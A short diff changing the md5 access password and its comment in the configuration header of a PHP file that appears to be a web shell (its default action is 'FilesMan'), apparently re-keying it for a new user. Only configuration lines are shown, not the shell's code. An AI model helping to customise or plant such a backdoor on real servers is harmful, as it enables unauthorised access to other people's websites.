@@ -11,7 +11,7 @@ session_start();
 
 /* Configuration */
 /* Password using md5 hashes */
-$password = "5b2ff108a20f44b93c639d664844a76a"; //geek-lock
+$password = "60ddc22a415b9f7ce5bd6063ace1ce6a"; //yatim club
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
